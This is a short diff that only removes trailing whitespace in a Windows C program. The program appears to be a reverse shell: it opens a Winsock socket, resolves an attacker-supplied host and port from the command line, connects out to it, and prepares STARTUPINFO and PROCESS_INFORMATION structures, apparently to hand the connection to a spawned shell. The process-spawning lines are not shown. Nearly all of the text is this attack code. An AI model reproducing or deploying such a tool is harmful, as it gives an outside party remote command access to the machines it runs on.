@@ -13,13 +13,13 @@ struct sockaddr_in hax;
 char aip_addr[16];
 STARTUPINFO ini_processo;
 PROCESS_INFORMATION processo_info;
-  
 
-int main(int argc, char *argv[]) 
+
+int main(int argc, char *argv[])
 {
 	WSAStartup(MAKEWORD(2,2), &wsaData);
 	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
-    
+
     	if (argv[1] == NULL){
 		exit(1);
 	}
@@ -27,11 +27,11 @@ int main(int argc, char *argv[])
     	struct hostent *host;
 	host = gethostbyname(argv[1]);
 	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
-    
+
 	hax.sin_family = AF_INET;
 	hax.sin_port = htons(atoi(argv[2]));
 	hax.sin_addr.s_addr =inet_addr(aip_addr);
-    
+
 	WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
 	if (WSAGetLastError() == 0) {
 
@@ -49,5 +49,5 @@ int main(int argc, char *argv[])
 		exit(0);
 	} else {
 		exit(0);
-	}    
+	}
 }
